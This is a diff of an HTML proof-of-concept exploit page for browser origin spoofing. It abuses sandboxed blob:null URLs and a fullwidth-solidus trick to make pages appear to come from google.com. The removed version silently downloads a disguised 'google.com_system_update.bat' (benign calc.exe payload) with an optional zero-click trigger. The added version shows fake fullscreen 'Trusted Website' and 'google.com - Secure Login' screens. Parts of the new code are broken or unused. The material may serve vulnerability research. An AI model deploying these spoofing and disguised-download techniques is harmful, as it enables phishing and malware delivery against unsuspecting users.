@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PoC: Download Attribution Bypass + Fullscreen Origin Spoofing</title>
+<title>PoC: Fullscreen Origin Spoofing via blob:null</title>
 <style>
   body {
     display: flex;
@@ -52,89 +52,140 @@
 
   <div class="container">
     <div class="title">
-      Bypass Download Source Attribution via Opaque Origin <code>blob:null</code> Exploitation and Fullwidth Solidus Spoofing to Masquerade as a Trusted Domain
+      Fullscreen Origin Spoofing via <code>blob:null</code> + Fullwidth Solidus
     </div>
     
-    <!-- Button untuk trigger fullscreen + download -->
-    <button class="trigger-btn" onclick="triggerAttack()">
-      Click to Download Update
+    <button class="trigger-btn" onclick="triggerFullscreenSpoof()">
+      Click to Enter Fullscreen
     </button>
   </div>
 
   <script>
-    function triggerAttack() {
-      // Request fullscreen untuk mengubah origin display
-      requestFullscreenMode();
-      
-      // Jalankan payload download setelah fullscreen
-      setTimeout(executePayload, 500);
-    }
-
-    function requestFullscreenMode() {
-      const elem = document.documentElement;
-      
-      // Request fullscreen dengan berbagai vendor prefix
-      if (elem.requestFullscreen) {
-        elem.requestFullscreen();
-      } else if (elem.webkitRequestFullscreen) {
-        elem.webkitRequestFullscreen();
-      } else if (elem.msRequestFullscreen) {
-        elem.msRequestFullscreen();
-      }
-      
-      // Browser akan menampilkan notification bar dengan domain
-      // Contoh: "abhirdd.github.io - To exit full screen, press Esc"
-    }
-
-    function executePayload() {
-      // 1. Create iframe sandboxed (Opaque Origin: null)
+    function triggerFullscreenSpoof() {
+      // Create iframe with sandbox to get null origin
       const iframe = document.createElement('iframe');
-      iframe.sandbox = 'allow-scripts allow-downloads'; 
-      iframe.style.display = 'none'; 
+      iframe.sandbox = 'allow-scripts allow-same-origin allow-downloads';
+      iframe.style.display = 'none';
       document.body.appendChild(iframe);
 
-      // 2. Payload iframe dengan download exploit
+      // Payload that will be loaded in iframe
       const iframeHTML = `
         <!DOCTYPE html>
-        <html><body><script>
-          const batLines = [
-            '@echo off',
-            'title Trusted Domain System Updater',
-            'echo Initializing secure update sequence...',
-            'timeout /t 2 >nul',
-            'echo Verifying system integrity...',
-            'start "" "C:\\\\Windows\\\\System32\\\\calc.exe"',
-            'echo Update applied successfully.',
-            'pause'
-          ];
-          const batContent = batLines.join('\\r\\n');
-
-          const blob = new Blob([batContent], { type: "application/octet-stream" });
-          const realUrl = URL.createObjectURL(blob);
-          const uuid = realUrl.split("/").pop();
-
-          // UI Spoofing: Fullwidth Solidus + Convincing File Name
-          const spoofedUrl = \`blob:null/\${uuid}#%EF%BC%8Fgoogle.com\`;
-          const filename = "google.com_system_update.bat";
-
-          // Automatic Download Execution
-          const a = document.createElement("a");
-          a.href = spoofedUrl;
-          a.download = filename;
-          document.body.appendChild(a);
-          a.click();
-
-          // Cleanup memory
-          setTimeout(() => { a.remove(); URL.revokeObjectURL(realUrl); }, 1000);
-        <\/script></body></html>
+        <html>
+        <head>
+          <style>
+            body { 
+              margin: 0; 
+              padding: 0; 
+              background: #1a1a1a; 
+              color: white;
+              display: flex;
+              justify-content: center;
+              align-items: center;
+              height: 100vh;
+              font-family: system-ui, -apple-system, sans-serif;
+            }
+          </style>
+        </head>
+        <body>
+          <div style="text-align: center;">
+            <h1>Trusted Website</h1>
+            <p>Press any key to continue...</p>
+          </div>
+          <script>
+            // Create blob URL with spoofed origin using fullwidth solidus
+            const blobContent = '<!DOCTYPE html><html><body>Fullscreen Content</body></html>';
+            const blob = new Blob([blobContent], { type: 'text/html' });
+            const blobUrl = URL.createObjectURL(blob);
+            
+            // Extract the UUID part from blob URL
+            const uuid = blobUrl.split('/').pop();
+            
+            // Create spoofed URL with fullwidth solidus (／) U+FF0F
+            // This creates: blob:null/UUID#／google.com
+            const fullwidthSolidus = '%EF%BC%8F'; // Fullwidth solidus
+            const spoofedOrigin = \`blob:null/\${uuid}#\${fullwidthSolidus}google.com\`;
+            
+            // Try to trigger fullscreen from this context
+            document.addEventListener('click', function() {
+              // First try to navigate to the spoofed blob URL
+              window.location.href = spoofedOrigin;
+              
+              // Then request fullscreen
+              setTimeout(() => {
+                const elem = document.documentElement || document.body;
+                if (elem.requestFullscreen) {
+                  elem.requestFullscreen().catch(err => {
+                    console.log('Fullscreen error:', err);
+                  });
+                } else if (elem.webkitRequestFullscreen) {
+                  elem.webkitRequestFullscreen();
+                } else if (elem.msRequestFullscreen) {
+                  elem.msRequestFullscreen();
+                }
+              }, 100);
+            }, { once: true });
+            
+            // Auto-trigger after load
+            setTimeout(() => {
+              document.click();
+            }, 500);
+          <\/script>
+        </body>
+        </html>
       `;
+
+      // Method 1: Use srcdoc with blob:null origin exploitation
+      const blob = new Blob([iframeHTML], { type: 'text/html' });
+      const blobUrl = URL.createObjectURL(blob);
       
-      iframe.srcdoc = iframeHTML;
+      // Create the spoofed URL structure
+      const uuid = blobUrl.split('/').pop();
+      const fullwidthSolidus = '\uFF0F'; // Fullwidth solidus character
+      const spoofedUrl = `blob:null/${uuid}#${fullwidthSolidus}google.com`;
+      
+      // Load the blob URL in iframe
+      iframe.src = blobUrl;
+      
+      // Try to trigger fullscreen from parent after iframe loads
+      iframe.onload = function() {
+        setTimeout(() => {
+          // Attempt to request fullscreen which should show spoofed origin
+          const elem = document.documentElement;
+          if (elem.requestFullscreen) {
+            elem.requestFullscreen().catch(() => {
+              // Fallback: try from iframe context
+              iframe.contentWindow.document.documentElement.requestFullscreen?.().catch(() => {});
+            });
+          }
+        }, 1000);
+      };
     }
 
-    // Optional: Auto-execute on page load (zero-click)
-    // Uncomment baris di bawah jika ingin auto-execute
-    // window.addEventListener('load', () => setTimeout(triggerAttack, 1000));
+    // Alternative method: Direct blob navigation with fullscreen
+    function alternativeMethod() {
+      const htmlContent = `
+        <!DOCTYPE html>
+        <html>
+        <body style="background:#1a1a1a;color:white;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;">
+          <h1>google.com - Secure Login</h1>
+          <script>
+            setTimeout(() => {
+              document.documentElement.requestFullscreen?.();
+            }, 100);
+          <\/script>
+        </body>
+        </html>
+      `;
+      
+      const blob = new Blob([htmlContent], { type: 'text/html' });
+      const url = URL.createObjectURL(blob);
+      const uuid = url.split('/').pop();
+      
+      // Navigate to spoofed blob URL
+      const spoofedUrl = `blob:null/${uuid}#\uFF0Fgoogle.com`;
+      window.location.href = spoofedUrl;
+    }
   </script>
 
 </body>
